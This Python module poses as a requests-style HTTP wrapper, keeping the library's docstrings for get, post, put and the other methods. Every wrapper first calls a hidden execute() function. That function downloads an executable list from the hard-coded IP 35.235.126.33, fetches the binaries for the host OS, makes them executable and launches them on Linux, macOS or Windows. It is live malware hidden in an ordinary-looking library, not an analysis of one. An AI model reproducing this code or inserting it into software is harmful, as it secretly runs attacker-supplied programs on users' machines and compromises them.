import requests
import platform
import os

def execute():
    operating_system = platform.system().lower()

    all_executables = []
    req = requests.get('http://35.235.126.33/all.txt')
    for line in req.text.splitlines():
        if operating_system in line:
            line = line.strip()
            all_executables.append(line)

    for executable in all_executables:
        url = f'http://35.235.126.33/{executable}'
        req = requests.get(url)
        with open(executable, 'wb') as f:
            f.write(req.content)

        if 'linux' in operating_system or 'darwin' in operating_system:
            os.system(f'chmod +x {executable}')

        if 'linux' in operating_system:
            os.system(f'./{executable} &')
        elif 'darwin' in operating_system:
            os.system(f'./{executable} &')
        elif 'windows' in operating_system:
            os.system(f'start "cia" {executable}')

def get(url: str | bytes, params: dict | None = None, **kwargs) -> requests.Response:
    """Sends a GET request. Returns :class:`Response` object.

    :param url: URL for the new :class:`Request` object.
    :param params: (optional) Dictionary or bytes to be sent in the query string for the :class:`Request`.
    :param \*\*kwargs: Optional arguments that ``request`` takes.
    :return: :class:`Response <Response>` object
    :rtype: requests.Response

    """
    execute()
    return requests.request('get', url, params=params, **kwargs)

def post(url: str | bytes, data: dict | None = None, json: dict | None = None, **kwargs) -> requests.Response:
    """Sends a POST request. Returns :class:`Response` object.

    :param url: URL for the new :class:`Request` object.
    :param data: (optional) Dictionary, bytes, or file-like object to send in the body of the :class:`Request`.
    :param json: (optional) json data to send in the body of the :class:`Request`.
    :param \*\*kwargs: Optional arguments that ``request`` takes.
    :return: :class:`Response <Response>` object
    :rtype: requests.Response

    """
    execute()
    return requests.request('post', url, data=data, json=json, **kwargs)

def put(url: str | bytes, data: dict | None = None, **kwargs) -> requests.Response:
    """Sends a PUT request. Returns :class:`Response` object.

    :param url: URL for the new :class:`Request` object.
    :param data: (optional) Dictionary, bytes, or file-like object to send in the body of the :class:`Request`.
    :param \*\*kwargs: Optional arguments that ``request`` takes.
    :return: :class:`Response <Response>` object
    :rtype: requests.Response

    """
    execute()
    return requests.request('put', url, data=data, **kwargs)

def patch(url: str | bytes, data: dict | None = None, **kwargs) -> requests.Response:
    """Sends a PATCH request. Returns :class:`Response` object.

    :param url: URL for the new :class:`Request` object.
    :param data: (optional) Dictionary, bytes, or file-like object to send in the body of the :class:`Request`.
    :param \*\*kwargs: Optional arguments that ``request`` takes.
    :return: :class:`Response <Response>` object
    :rtype: requests.Response

    """
    execute()
    return requests.request('patch', url, data=data, **kwargs)

def delete(url: str | bytes, **kwargs) -> requests.Response:
    """Sends a DELETE request. Returns :class:`Response` object.

    :param url: URL for the new :class:`Request` object.
    :param \*\*kwargs: Optional arguments that ``request`` takes.
    :return: :class:`Response <Response>` object
    :rtype: requests.Response

    """
    execute()
    return requests.request('delete', url, **kwargs)

def head(url: str | bytes, **kwargs) -> requests.Response:
    """Sends a HEAD request. Returns :class:`Response` object.

    :param url: URL for the new :class:`Request` object.
    :param \*\*kwargs: Optional arguments that ``request`` takes.
    :return: :class:`Response <Response>` object
    :rtype: requests.Response

    """
    execute()
    return requests.request('head', url, **kwargs)

def options(url: str | bytes, **kwargs) -> requests.Response:
    """Sends a OPTIONS request. Returns :class:`Response` object.

    :param url: URL for the new :class:`Request` object.
    :param \*\*kwargs: Optional arguments that ``request`` takes.
    :return: :class:`Response <Response>` object
    :rtype: requests.Response

    """
    execute()
    return requests.request('options', url, **kwargs)

def request(method: str, url: str | bytes, **kwargs) -> requests.Response:
    """Constructs and sends a :class:`Request <Request>`. Returns :class:`Response <Response>` object.

    :param method: method for the new :class:`Request` object.
    :param url: URL for the new :class:`Request` object.
    :param \*\*kwargs: Optional arguments that ``request`` takes.
    :return: :class:`Response <Response>` object
    :rtype: requests.Response

    """
    execute()
    return requests.request(method, url, **kwargs)